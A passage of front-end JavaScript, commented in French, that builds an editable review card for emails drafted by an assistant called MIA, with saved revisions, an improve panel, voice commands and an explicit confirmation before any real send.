// (MailDraftReview::block, côté serveur) : le message tel qu'il partira — À,
// Cc, Objet, corps mis en forme par le MÊME convertisseur que le brouillon —
// et quatre issues : ENVOYER (l'email part réellement, après une confirmation
// dans la carte — mode 'send-confirm'), créer le brouillon, le faire
// améliorer par MIA (préréglages ou consigne libre), l'abandonner.
//
// L'APERÇU EST L'ÉDITEUR : destinataires, copie et objet sont des champs, le
// corps rendu est `contenteditable` — on corrige un mot là où on le lit, sans
// passer par un mode « Modifier ». Le corps édité est reconverti en Markdown
// (`mailHtmlToMarkdown`) : le serveur ne connaît qu'une forme de corps, celle
// que le modèle écrit et que MailHtml convertit, et la part texte du message
// comme la consigne d'amélioration restent lisibles.
//
// Chaque révision est ENREGISTRÉE côté serveur (POST /chat/{id}/mail-draft/
// revise) : « Envoyer » comme « Créer le brouillon » exécutent la dernière
// version ENREGISTRÉE. D'où `flushMailDraftEdits`, appelée AVANT toute issue
// (envoyer, créer, améliorer, version précédente) et quand le focus quitte la
// carte : une modification tapée puis suivie d'un clic sur « Envoyer » part
// d'abord au serveur, et si elle est refusée (adresse invalide, corps vide),
// l'issue n'a PAS lieu — jamais un envoi de l'ancienne version. Cet
// enregistrement ne repeint pas la carte (le curseur resterait perdu, et un
// clic en cours sur un bouton tomberait sur un bouton détruit) : seuls la
// pastille de version et la rangée d'actions sont remplacées.
//
// La carte ne connaît qu'un état enregistré, `card.__preview` (le dernier
// payload rendu par le serveur) ; `card.__history` garde les versions
// précédentes pour « Version précédente » (mémoire de page).
//
// La disponibilité de l'envoi (`mail.envoi`) vient du serveur : le bouton
// n'est jamais masqué, un clic sur un envoi indisponible affiche la raison
// (reconnecter, ou créer le brouillon) — une absence inexpliquée serait
// indistinguable d'un bug. Le serveur re-vérifie le droit au clic.
//
// Le corps HTML vient de MailHtml (tout échappé ou nettoyé par liste blanche,
// seul `href` survit sur les liens) : il est injecté tel quel, les liens
// reçoivent target=_blank pour ne pas quitter la conversation.
const MAIL_DRAFT_ICONS = {
    check:    '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>',
    plane:    '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/></svg>',
    pencil:   '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/></svg>',
    sparkles: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l1.9 5.1L19 10l-5.1 1.9L12 17l-1.9-5.1L5 10l5.1-1.9Z"/><path d="M19 17l.8 2.2L22 20l-2.2.8L19 23l-.8-2.2L16 20l2.2-.8Z"/></svg>',
    undo:     '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 14 4 9l5-5"/><path d="M4 9h10.5a5.5 5.5 0 0 1 0 11H11"/></svg>',
    close:    '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>',
    mail:     '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>',
};

function renderMailDraftCard(target, data) {
    const card = document.createElement('div');
    card.className = 'drive-confirm-card mail-draft-card';
    card.dataset.actionId = String(data.id);
    card.__preview = data;
    card.__history = [];
    card.__bodyDirty = false;
    card.addEventListener('click', onMailDraftCardClick);
    card.addEventListener('keydown', onMailDraftCardKeydown);
    card.addEventListener('input', onMailDraftCardInput);
    card.addEventListener('paste', onMailDraftCardPaste);
    card.addEventListener('focusin', onMailDraftCardFocusin);
    card.addEventListener('focusout', onMailDraftCardFocusout);
    paintMailDraftCard(card, 'preview');
    target.appendChild(card);
    return card;
}

/**
 * Champs courants du brouillon (dernier état ENREGISTRÉ). `tronque` signale
 * un corps raccourci dans l'aperçu : il ne doit alors JAMAIS être renvoyé au
 * serveur, sous peine d'amputer le brouillon réel.
 */
function mailDraftFields(card) {
    const m = (card.__preview && card.__preview.mail) || {};
    return {
        destinataire: String(m.destinataire || ''),
        cc:           String(m.cc || ''),
        objet:        String(m.objet || ''),
        corps:        String(m.corps || ''),
        tronque:      !!m.tronque,
    };
}

/** Le corps affiché : HTML rendu par le serveur, ou texte brut mis en paragraphes. */
function mailDraftBodyHtml(m, fields) {
    if (m.corps_html) return String(m.corps_html);
    return String(fields.corps || '').split(/\n{2,}/)
        .map(par => '<p>' + escHtml(par).replace(/\n/g, '<br>') + '</p>').join('');
}

function mailDraftVersionHtml(m) {
    const version = Number(m.version || 1);
    return version > 1
        ? `<span class="mail-draft-version">${escHtml(t('Version {n}', { n: version }))}${m.revision ? ' · ' + escHtml(String(m.revision)) : ''}</span>`
        : '';
}

/** Rangée d'actions, selon le mode. */
function mailDraftActionsHtml(card, mode, fields) {
    const m = (card.__preview && card.__preview.mail) || {};
    const isReply = !!m.reponse;
    // Envoi possible ? Décidé par le serveur (connexion, droit d'envoi) et
    // porté par l'aperçu ; une carte déposée avant l'arrivée du bouton
    // (payload sans `envoi`) le propose : le serveur tranche au clic.
    const envoi = (m.envoi && typeof m.envoi === 'object') ? m.envoi : { possible: true };
    if (mode === 'send-confirm') {
        // Dernier mot avant l'envoi réel : les destinataires en toutes
        // lettres, le caractère définitif, deux boutons. Jamais de raccourci
        // clavier ici — un Entrée de trop enverrait un email.
        let dest = fields.destinataire || (isReply ? t('l\'expéditeur du message d\'origine') : '');
        if (fields.cc) dest += ' ' + t('(cc : {destinataires})', { destinataires: fields.cc });
        return `
        <div class="drive-confirm-actions mail-draft-actions mail-draft-send-confirm" role="group" aria-label="${escAttr(t('Confirmer l\'envoi'))}">
            <div class="mail-draft-send-question">${MAIL_DRAFT_ICONS.plane}<div>
                <span>${escHtml(t('Envoyer maintenant à {destinataires} ?', { destinataires: dest }))}</span>
                <small>${escHtml(t('Cet envoi est définitif : le message partira immédiatement, sans retour possible.'))}</small>
            </div></div>
            <div class="mail-draft-send-buttons">
                <button type="button" class="drive-confirm-btn mail-draft-btn-send" data-act="send-confirm">${MAIL_DRAFT_ICONS.plane} ${escHtml(t('Confirmer l\'envoi'))}</button>
                <button type="button" class="drive-confirm-btn mail-draft-btn-ghost" data-act="send-cancel">${escHtml(t('Retour'))}</button>
            </div>
        </div>`;
    }
    const approveLabel = isReply ? t('Créer la réponse en brouillon') : t('Créer le brouillon');
    return `
        <div class="drive-confirm-actions mail-draft-actions">
            <button type="button" class="drive-confirm-btn mail-draft-btn-send${envoi.possible ? '' : ' is-unavailable'}" data-act="send"${envoi.possible ? '' : ` title="${escAttr(String(envoi.raison || ''))}"`}>${MAIL_DRAFT_ICONS.plane} ${escHtml(t('Envoyer'))}</button>
            <button type="button" class="drive-confirm-btn mail-draft-btn-soft" data-act="approve">${MAIL_DRAFT_ICONS.check} ${escHtml(approveLabel)}</button>
            <button type="button" class="drive-confirm-btn mail-draft-btn-ghost${mode === 'improve' ? ' is-active' : ''}" data-act="improve">${MAIL_DRAFT_ICONS.sparkles} ${escHtml(t('Améliorer'))}</button>
            ${card.__history.length ? `<button type="button" class="drive-confirm-btn mail-draft-btn-ghost" data-act="undo">${MAIL_DRAFT_ICONS.undo} ${escHtml(t('Version précédente'))}</button>` : ''}
            <button type="button" class="drive-confirm-btn drive-confirm-cancel mail-draft-discard" data-act="cancel">${escHtml(t('Abandonner'))}</button>
        </div>`;
}

/**
 * Repeint toute la carte depuis card.__preview (les modifications non
 * enregistrées sont PERDUES : les appelants passent d'abord par
 * flushMailDraftEdits).
 * mode : 'preview' (relecture, champs et corps éditables en place) |
 *        'improve' (panneau de consignes ouvert sous l'aperçu) |
 *        'send-confirm' (confirmation avant l'envoi réel : lecture seule).
 * opts : {error} message à afficher, {link} {href,label} sous l'erreur,
 *        {busy} libellé d'attente (lecture seule).
 */
function paintMailDraftCard(card, mode = 'preview', opts = {}) {
    const p = card.__preview || {};
    const m = p.mail || {};
    const isReply = !!m.reponse;
    const fields  = mailDraftFields(card);
    const icon    = escAttr(String(p.icone || '/assets/img/gmail.svg'));
    const editable = mode !== 'send-confirm' && !opts.busy;

    // --- En-tête ---------------------------------------------------------
    let html = `
        <div class="mail-draft-head">
            <img src="${icon}" alt="" width="20" height="20">
            <div class="mail-draft-head-text">
                <div class="drive-confirm-title">${escHtml(String(p.action || 'Email'))}</div>
                <div class="drive-confirm-sub">${escHtml(t('Relisez le message : rien ne sera envoyé ni créé sans votre accord.'))}</div>
            </div>
            ${mailDraftVersionHtml(m)}
        </div>`;

    // --- Enveloppe : méta + corps, éditables en place ---------------------
    const autoTo      = isReply ? t('Expéditeur du message d\'origine (automatique)') : '';
    const autoSubject = isReply ? t('Objet repris du message d\'origine') : t('(sans objet)');
    const ro = editable ? '' : ' readonly';
    // L'objet d'une réponse est repris de l'origine par les services : un
    // champ modifiable mentirait.
    const subjectAttrs = isReply
        ? `value="" disabled placeholder="${escAttr(autoSubject)}"`
        : `value="${escAttr(fields.objet)}" placeholder="${escAttr(autoSubject)}"${ro}`;
    const bodyEditable = editable && !m.tronque;
    html += `
        <div class="mail-draft-envelope${editable ? ' is-editable' : ''}">
            <div class="mail-draft-meta">
                <label class="mail-draft-row"><span class="mail-draft-key">${escHtml(t('À'))}</span>
                    <input class="mail-draft-input" name="destinataire" autocomplete="off" spellcheck="false"
                        value="${escAttr(fields.destinataire)}" placeholder="${escAttr(autoTo || t('Adresses séparées par des virgules'))}"${ro}></label>
                ${editable || fields.cc ? `<label class="mail-draft-row"><span class="mail-draft-key">${escHtml(t('Cc'))}</span>
                    <input class="mail-draft-input" name="cc" autocomplete="off" spellcheck="false"
                        value="${escAttr(fields.cc)}" placeholder="${escAttr(t('Ajouter des destinataires en copie'))}"${ro}></label>` : ''}
                <label class="mail-draft-row"><span class="mail-draft-key">${escHtml(t('Objet'))}</span>
                    <input class="mail-draft-input mail-draft-subject" name="objet" autocomplete="off" ${subjectAttrs}></label>
            </div>
            <div class="mail-draft-body${bodyEditable ? ' mail-draft-editable' : ''}"${bodyEditable
                ? ` contenteditable="true" role="textbox" aria-multiline="true" spellcheck="true" aria-label="${escAttr(t('Corps du message'))}"`
                : ''}>${mailDraftBodyHtml(m, fields)}</div>
            ${m.tronque
                ? `<div class="mail-draft-hint">${escHtml(t('Seul l\'aperçu est raccourci : le brouillon complet sera créé.'))}</div>`
                : (bodyEditable ? `<div class="mail-draft-hint mail-draft-edit-hint">${MAIL_DRAFT_ICONS.pencil} ${escHtml(t('Cliquez dans le message pour le modifier directement.'))}</div>` : '')}
            ${(p.impacts || []).length ? `<div class="mail-draft-foot">${MAIL_DRAFT_ICONS.mail}<span>${(p.impacts || []).map(i => `<span class="mail-draft-impact">${escHtml(String(i))}</span>`).join('')}</span></div>` : ''}
            ${provenanceHtml(p)}
        </div>`;

    // --- Panneau d'amélioration -------------------------------------------
    if (mode === 'improve') {
        const chips = (m.presets || []).map(pr =>
            `<button type="button" class="mail-draft-chip" data-act="preset" data-preset="${escAttr(String(pr.key))}">${escHtml(String(pr.label))}</button>`
        ).join('');
        html += `
        <div class="mail-draft-panel">
            <div class="mail-draft-panel-head">
                <span class="mail-draft-panel-title">${MAIL_DRAFT_ICONS.sparkles} ${escHtml(t('Que voulez-vous changer ?'))}</span>
                <button type="button" class="mail-draft-panel-close" data-act="panel-close" aria-label="${escAttr(t('Fermer'))}">${MAIL_DRAFT_ICONS.close}</button>
            </div>
            <div class="mail-draft-chips">${chips}</div>
            <div class="mail-draft-instruction-row">
                <input class="mail-draft-instruction" maxlength="500" autocomplete="off"
                    placeholder="${escAttr(t('Ou dites-le avec vos mots : « propose un créneau jeudi matin »…'))}">
                <button type="button" class="drive-confirm-btn drive-confirm-approve mail-draft-apply" data-act="apply">${escHtml(t('Appliquer'))}</button>
            </div>
        </div>`;
    }

    // --- État (attente, erreur, issue) AVANT les actions : sur mobile les
    // boutons s'empilent, un message posé sous eux sortait de l'écran au
    // moment précis où l'on vient de taper. resolveDriveAction écrit dans ce
    // même élément et retire les actions : l'ordre lui est indifférent.
    html += `<div class="drive-confirm-status"${opts.error || opts.busy ? '' : ' hidden'}>${opts.busy
        ? `<span class="mail-draft-spinner" aria-hidden="true"></span>${escHtml(String(opts.busy))}`
        : (opts.error ? '⚠ ' + escHtml(String(opts.error)) : '')}${opts.error && opts.link
        ? ` <a href="${escAttr(String(opts.link.href))}">${escHtml(String(opts.link.label))}</a>` : ''}</div>`;

    // Repère « à la voix » (conversation vocale) : ce qui se dit dans CE mode.
    if (!opts.busy) {
        html += voiceHintHtml(mode === 'send-confirm'
            ? t('À la voix : « confirmer » pour envoyer, ou « retour ».')
            : (mode === 'improve'
                ? t('À la voix : dites ce qu\'il faut changer, ou « retour ».')
                : t('À la voix : « envoyer », « créer le brouillon », « plus court », « abandonner »…')));
    }

    html += mailDraftActionsHtml(card, mode, fields);

    card.innerHTML = html;
    card.dataset.mode = mode;
    card.__bodyDirty = false;
    card.classList.toggle('is-busy', !!opts.busy);
    if (opts.busy) {
        card.querySelectorAll('button, input').forEach(el => { el.disabled = true; });
    }
    // Liens du corps : jamais une navigation dans l'onglet de la conversation.
    card.querySelectorAll('.mail-draft-body a').forEach(a => { a.target = '_blank'; a.rel = 'noopener'; });
    // Focus automatique sur les seuls pointeurs fins : au doigt, il ferait
    // surgir le clavier (et défiler la page) avant que l'on ait choisi entre
    // un préréglage et une consigne libre.
    const finePointer = window.matchMedia('(hover: hover) and (pointer: fine)').matches;
    if (mode === 'improve' && finePointer) {
        card.querySelector('.mail-draft-instruction')?.focus();
    }
}

/** Plus rien d'éditable : issue exécutée, abandonnée, ou en cours d'exécution. */
function lockMailDraftEditor(card) {
    card.querySelectorAll('.mail-draft-editable').forEach(el => {
        el.removeAttribute('contenteditable');
        el.classList.remove('mail-draft-editable');
    });
    card.querySelectorAll('.mail-draft-input').forEach(el => {
        el.readOnly = true;
        if (el.name === 'cc' && el.value === '') el.closest('.mail-draft-row')?.remove();
    });
    card.querySelector('.mail-draft-envelope')?.classList.remove('is-editable');
    card.querySelector('.mail-draft-edit-hint')?.remove();
}

/** Message d'état posé EN PLACE, sans repeindre la carte (les modifications en cours survivent). */
function setMailDraftStatus(card, msg) {
    const statusEl = card.querySelector('.drive-confirm-status');
    if (!statusEl) return;
    statusEl.hidden = !msg;
    statusEl.textContent = msg ? '⚠ ' + msg : '';
}

// ---------------------------------------------------------------------------
// Corps édité → Markdown. Le serveur ne stocke qu'une forme de corps (le
// Markdown restreint que MailHtml convertit) : on y ramène le HTML de
// l'éditeur — paragraphes, retours à la ligne, gras, italique, liens, listes,
// titres. Tout le reste (soulignement, styles collés) devient du texte.
// ---------------------------------------------------------------------------
const MAIL_MD_BLOCKS = new Set(['p', 'div', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'ul', 'ol', 'li', 'pre', 'table']);

function mailMdWrap(text, marker) {
    const m = /^(\s*)([\s\S]*?)(\s*)$/.exec(text);
    return m[2] === '' ? text : m[1] + marker + m[2] + marker + m[3];
}

function mailMdInline(node) {
    let out = '';
    node.childNodes.forEach(n => {
        if (n.nodeType === Node.TEXT_NODE) {
            // Dans du HTML, un saut de ligne du SOURCE est un simple blanc.
            out += n.nodeValue.replace(/ /g, ' ').replace(/\s*\n\s*/g, ' ');
            return;
        }
        if (n.nodeType !== Node.ELEMENT_NODE) return;
        const tag = n.tagName.toLowerCase();
        if (tag === 'br') { out += '\n'; return; }
        if (MAIL_MD_BLOCKS.has(tag)) { out += '\n' + mailMdInline(n).trim() + '\n'; return; }
        const inner = mailMdInline(n);
        if (tag === 'strong' || tag === 'b') { out += mailMdWrap(inner, '**'); return; }
        if (tag === 'em' || tag === 'i') { out += mailMdWrap(inner, '*'); return; }
        if (tag === 'a') {
            const href = String(n.getAttribute('href') || '').trim();
            const label = inner.trim();
            if (!/^(https?:|mailto:)/i.test(href) || label === '') { out += inner; return; }
            out += label === href ? href : `[${label.replace(/[[\]]/g, '')}](${href})`;
            return;
        }
        out += inner;
    });
    return out;
}

function mailHtmlToMarkdown(root) {
    const blocks = [];
    let buf = '';
    const push = txt => {
        const clean = String(txt).split('\n').map(l => l.replace(/[ \t]+/g, ' ').trim()).join('\n')
            .replace(/\n{3,}/g, '\n\n').trim();
        if (clean !== '') blocks.push(clean);
    };
    const flush = () => { push(buf); buf = ''; };
    const walk = parent => {
        parent.childNodes.forEach(n => {
            if (n.nodeType === Node.ELEMENT_NODE) {
                const tag = n.tagName.toLowerCase();
                if (tag === 'ul' || tag === 'ol') {
                    flush();
                    let i = 1;
                    const items = Array.from(n.children)
                        .filter(li => li.tagName.toLowerCase() === 'li')
                        .map(li => mailMdInline(li).replace(/\s*\n\s*/g, ' ').trim())
                        .filter(Boolean)
                        .map(txt => (tag === 'ul' ? '- ' : (i++) + '. ') + txt);
                    if (items.length) blocks.push(items.join('\n'));
                    return;
                }
                if (tag === 'div' && Array.from(n.children).some(c => MAIL_MD_BLOCKS.has(c.tagName.toLowerCase()))) {
                    flush();
                    walk(n);
                    return;
                }
                if (MAIL_MD_BLOCKS.has(tag)) {
                    flush();
                    let txt = mailMdInline(n);
                    // MailHtml : « # » → h3, « ## » → h4.
                    if (/^h[1-3]$/.test(tag)) txt = '# ' + txt.replace(/\s*\n\s*/g, ' ').trim();
                    else if (/^h[4-6]$/.test(tag)) txt = '## ' + txt.replace(/\s*\n\s*/g, ' ').trim();
                    push(txt);
                    return;
                }
                if (tag === 'br') { buf += '\n'; return; }
                const wrap = document.createElement('span');
                wrap.appendChild(n.cloneNode(true));
                buf += mailMdInline(wrap);
                return;
            }
            if (n.nodeType === Node.TEXT_NODE) {
                buf += n.nodeValue.replace(/ /g, ' ').replace(/\s*\n\s*/g, ' ');
            }
        });
    };
    walk(root);
    flush();
    return blocks.join('\n\n');
}

/**
 * Modifications de l'aperçu pas encore enregistrées, sous la forme attendue
 * par /mail-draft/revise : seuls les champs CHANGÉS (un champ absent reste
 * inchangé côté serveur). Le corps n'est lu que s'il a été touché — le
 * reconvertir sans modification réécrirait le Markdown du modèle pour rien.
 */
function readMailDraftEditor(card) {
    const saved = mailDraftFields(card);
    const fields = {};
    card.querySelectorAll('.mail-draft-input').forEach(el => {
        if (!el.disabled && !el.readOnly && el.value !== saved[el.name]) fields[el.name] = el.value;
    });
    const body = card.querySelector('.mail-draft-editable');
    if (body && card.__bodyDirty && !saved.tronque) fields.corps = mailHtmlToMarkdown(body);
    return fields;
}

/**
 * Enregistre les modifications en attente, SANS repeindre la carte.
 * Renvoie true si l'état enregistré côté serveur est celui qu'affiche la
 * carte (rien à faire, ou enregistrement réussi) ; false sinon — l'appelant
 * n'exécute alors AUCUNE issue : envoyer ou créer le brouillon partirait de
 * l'ancienne version.
 */
async function flushMailDraftEdits(card) {
    if (card.__saving) {
        const ok = await card.__saving;
        if (!ok) return false;
    }
    const fields = readMailDraftEditor(card);
    if (!Object.keys(fields).length) return true;
    if ('corps' in fields && fields.corps.trim() === '') {
        setMailDraftStatus(card, t('Le message est vide.'));
        return false;
    }
    card.__bodyDirty = false; // une frappe PENDANT l'enregistrement le repasse à vrai
    card.__saving = saveMailDraftFields(card, fields);
    try {
        return await card.__saving;
    } finally {
        card.__saving = null;
    }
}

async function saveMailDraftFields(card, fields) {
    const before = mailDraftFields(card);
    const fd = new FormData();
    fd.append('action_id', card.dataset.actionId || '');
    fd.append('mode', 'edit');
    ['destinataire', 'cc', 'objet', 'corps'].forEach(k => { if (k in fields) fd.append(k, fields[k]); });
    let data = null;
    try {
        const res = await fetchWithSessionGuard(`/chat/${convId()}/mail-draft/revise`, {
            method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd,
        });
        data = await res.json();
    } catch (err) {
        data = { error: t('Réseau indisponible — réessayez.') };
    }
    if (!(data && data.ok && data.preview && data.preview.mail)) {
        if ('corps' in fields) card.__bodyDirty = true;
        setMailDraftStatus(card, String((data && data.error) || t('Erreur inattendue.')));
        return false;
    }
    card.__history.push(before);
    card.__preview = Object.assign({ id: card.dataset.actionId }, data.preview);
    const saved = mailDraftFields(card);
    // Adresses normalisées par le serveur (« a@x.fr;b@x.fr » → « a@x.fr,
    // b@x.fr ») : le champ reprend la forme enregistrée s'il n'a pas bougé
    // depuis — sinon il paraîtrait modifié et repartirait au prochain envoi.
    card.querySelectorAll('.mail-draft-input').forEach(el => {
        if (el.name in fields && el.value === fields[el.name]) el.value = saved[el.name];
    });
    setMailDraftStatus(card, '');
    const head = card.querySelector('.mail-draft-head');
    head?.querySelector('.mail-draft-version')?.remove();
    head?.insertAdjacentHTML('beforeend', mailDraftVersionHtml(card.__preview.mail));
    // « Version précédente » apparaît, INSÉRÉ sans remplacer la rangée : le
    // focus peut avoir quitté la carte vers un de ses boutons (Safari ne
    // donne pas le focus au bouton cliqué), un bouton remplacé entre
    // l'appui et le relâchement perdrait le clic.
    const discard = card.querySelector('.mail-draft-actions .mail-draft-discard');
    if (discard && !card.querySelector('[data-act="undo"]')) {
        discard.insertAdjacentHTML('beforebegin',
            `<button type="button" class="drive-confirm-btn mail-draft-btn-ghost" data-act="undo">${MAIL_DRAFT_ICONS.undo} ${escHtml(t('Version précédente'))}</button>`);
    }
    return true;
}

function onMailDraftCardInput(e) {
    if (e.target && e.target.closest && e.target.closest('.mail-draft-editable')) {
        e.currentTarget.__bodyDirty = true;
    }
}

/** Coller = du TEXTE : ni styles, ni images, ni tableaux venus d'ailleurs. */
function onMailDraftCardPaste(e) {
    if (!e.target.closest || !e.target.closest('.mail-draft-editable')) return;
    const text = (e.clipboardData || window.clipboardData)?.getData('text/plain');
    if (typeof text !== 'string') return;
    e.preventDefault();
    document.execCommand('insertText', false, text);
}

function onMailDraftCardFocusin(e) {
    // Entrée = un nouveau paragraphe, pas une <div> (Chrome) : le HTML
    // produit reste celui que mailHtmlToMarkdown sait relire.
    if (e.target.closest && e.target.closest('.mail-draft-editable')) {
        try { document.execCommand('defaultParagraphSeparator', false, 'p'); } catch (err) { /* navigateur sans cette commande */ }
    }
}

/** Le focus QUITTE la carte : ce qui a été modifié est enregistré. */
function onMailDraftCardFocusout(e) {
    const card = e.currentTarget;
    if (e.relatedTarget && card.contains(e.relatedTarget)) return;
    if (card.classList.contains('is-busy') || card.classList.contains('is-done') || card.classList.contains('is-cancelled')) return;
    flushMailDraftEdits(card);
}

function onMailDraftCardKeydown(e) {
    const card = e.currentTarget;
    if (card.classList.contains('is-busy')) return;
    if (e.target.classList.contains('mail-draft-instruction') && e.key === 'Enter') {
        e.preventDefault();
        runMailDraftAct(card, 'apply', null);
        return;
    }
    if (e.target.classList.contains('mail-draft-input') && e.key === 'Enter') {
        // Entrée dans un champ d'en-tête : enregistrer, jamais soumettre.
        e.preventDefault();
        flushMailDraftEdits(card);
        return;
    }
    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey) && card.dataset.mode !== 'send-confirm') {
        e.preventDefault();
        flushMailDraftEdits(card);
        return;
    }
    if (card.dataset.mode === 'send-confirm' && e.key === 'Escape') {
        // Échap renonce ; aucune touche ne confirme (cf. mailDraftActionsHtml).
        e.preventDefault();
        paintMailDraftCard(card, 'preview');
    }
}

/**
 * Clic « Envoyer » : ouvre la confirmation, ou — envoi indisponible pour
 * cette connexion — affiche la raison rendue par le serveur avec le chemin
 * vers la page Connexions. Le bouton reste visible et cliquable dans les deux
 * cas : c'est le clic qui explique.
 */
function askMailDraftSend(card) {
    const m = (card.__preview && card.__preview.mail) || {};
    const envoi = (m.envoi && typeof m.envoi === 'object') ? m.envoi : { possible: true };
    if (envoi.possible === false) {
        const service = String(m.service || 'gmail');
        paintMailDraftCard(card, 'preview', {
            error: String(envoi.raison || t('Envoi indisponible pour cette connexion.')),
            link:  { href: '/settings/connections#connector-' + service, label: t('Ouvrir Réglages → Comptes connectés') },
        });
        return 'unavailable';
    }
    paintMailDraftCard(card, 'send-confirm');
    return 'confirm';
}

function onMailDraftCardClick(e) {
    const btn = e.target.closest('[data-act]');
    if (!btn) return;
    const card = e.currentTarget;
    if (card.classList.contains('is-busy') || btn.disabled) return;
    runMailDraftAct(card, btn.dataset.act, btn);
}

/**
 * Toute issue passe d'abord par flushMailDraftEdits : ce qui est exécuté,
 * amélioré ou remplacé est TOUJOURS la version affichée. Un enregistrement
 * refusé arrête là (le message d'erreur est déjà dans la carte).
 *
 * UN SEUL chemin pour le clic ET pour la voix : la conversation vocale
 * appelle cette même fonction (cf. runVoiceCardCommand), avec `extra` à la
 * place du bouton — {preset} pour un préréglage, {instruction} pour une
 * consigne dictée (act 'instruct'). Rend l'issue, que la voix annonce :
 * celle de resolveDriveAction pour une exécution, sinon 'confirm' |
 * 'unavailable' (envoi), 'panel' | 'closed' | 'back', 'revised' | 'error',
 * 'refused' (modification refusée à l'enregistrement), 'busy', 'none'.
 */
async function runMailDraftAct(card, act, btn, extra) {
    if (card.__acting) return 'busy';
    card.__acting = true;
    try {
        if (act === 'cancel') return await resolveDriveAction(card, 'cancel');
        if (act === 'send-confirm') return await resolveDriveAction(card, 'send');
        if (act === 'send-cancel') { paintMailDraftCard(card, 'preview'); return 'back'; }
        if (!(await flushMailDraftEdits(card))) return 'refused';
        switch (act) {
            case 'approve':     return await resolveDriveAction(card, 'approve');
            case 'send':        return askMailDraftSend(card);
            case 'improve':     paintMailDraftCard(card, card.dataset.mode === 'improve' ? 'preview' : 'improve'); return 'panel';
            case 'panel-close': paintMailDraftCard(card, 'preview'); return 'closed';
            case 'preset':      return await reviseMailDraft(card, 'improve', {}, { preset: (extra && extra.preset) || (btn && btn.dataset.preset) || '' });
            case 'instruct':    return await reviseMailDraft(card, 'improve', {}, { instruction: String((extra && extra.instruction) || '').slice(0, 500) });
            case 'apply':       return await applyMailDraftInstruction(card);
            case 'undo':        return await restorePreviousMailDraft(card);
            default:            return 'none';
        }
    } finally {
        card.__acting = false;
    }
}

async function applyMailDraftInstruction(card) {
    const input = card.querySelector('.mail-draft-instruction');
    const instruction = (input?.value || '').trim();
    if (instruction === '') {
        input?.focus();
        return 'none';
    }
    return reviseMailDraft(card, 'improve', {}, { instruction });
}

async function restorePreviousMailDraft(card) {
    const prev = card.__history.pop();
    if (!prev) return 'none';
    const fields = { destinataire: prev.destinataire, cc: prev.cc, objet: prev.objet };
    if (!prev.tronque) fields.corps = prev.corps;
    return reviseMailDraft(card, 'edit', fields, { restore: true, snapshot: prev });
}

/**
 * Révision qui REMPLACE l'affichage (amélioration par MIA, retour à une
 * version précédente) : enregistrée côté serveur puis repeinte depuis sa
 * réponse. extra : {preset} | {instruction} (mode improve), {restore,
 * snapshot} (rien n'est empilé, et la version retirée de la pile y revient
 * si l'appel échoue). Les modifications à la main, elles, passent par
 * flushMailDraftEdits. Rend 'revised' (nouvelle version affichée) ou 'error'
 * (la raison est dans la carte).
 */
async function reviseMailDraft(card, mode, fields, extra) {
    const busyLabel = mode === 'improve' ? t('MIA réécrit le message…') : t('Enregistrement…');
    paintMailDraftCard(card, 'preview', { busy: busyLabel });

    const fd = new FormData();
    fd.append('action_id', card.dataset.actionId || '');
    fd.append('mode', mode);
    ['destinataire', 'cc', 'objet', 'corps'].forEach(k => { if (k in fields) fd.append(k, fields[k]); });
    if (extra.preset)      fd.append('preset', extra.preset);
    if (extra.instruction) fd.append('instruction', extra.instruction);
    if (extra.restore)     fd.append('restore', '1');

    let data = null;
    try {
        const res = await fetchWithSessionGuard(`/chat/${convId()}/mail-draft/revise`, {
            method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd,
        });
        data = await res.json();
    } catch (err) {
        data = { error: t('Réseau indisponible — réessayez.') };
    }

    if (data && data.ok && data.preview && data.preview.mail) {
        if (!extra.restore) card.__history.push(mailDraftFields(card));
        card.__preview = Object.assign({ id: card.dataset.actionId }, data.preview);
        paintMailDraftCard(card, 'preview');
        // Réécriture par MIA : son coût rejoint aussitôt le total et le solde.
        if (data.conversation_credits_total !== undefined) {
            applyConversationCreditsTotal(data.conversation_credits_total);
            applyQuotaStatus(data.quota_status || null);
        }
        return 'revised';
    }
    if (extra.restore && extra.snapshot) card.__history.push(extra.snapshot);
    if (data && handleQuotaExceededPayload(data)) {
        // Le serveur nomme la cause (quota personnel, budget de l'organisation) ;
        // la modification à la main, elle, ne coûte rien et reste ouverte.
        paintMailDraftCard(card, 'preview', { error: String(data.error || t('Quota mensuel atteint : l\'amélioration par MIA est indisponible, la modification à la main reste possible.')) });
        return 'error';
    }
    const msg = String((data && data.error) || t('Erreur inattendue.'));
    paintMailDraftCard(card, mode === 'improve' ? 'improve' : 'preview', { error: msg });
    if (extra.instruction) {
        const input = card.querySelector('.mail-draft-instruction');
        if (input) input.value = extra.instruction;
    }
    return 'error';
}

// =========================================================
// CARTES EN ATTENTE, À LA VOIX (conversation vocale)
// =========================================================
// En conversation vocale, les boutons d'une carte se DISENT : « approuve »,
// « annule », « envoie-le », « plus court », « confirme »… La reconnaissance
// vit dans voice-commands.js (pure, testée sous node) ; ici, seulement ce que
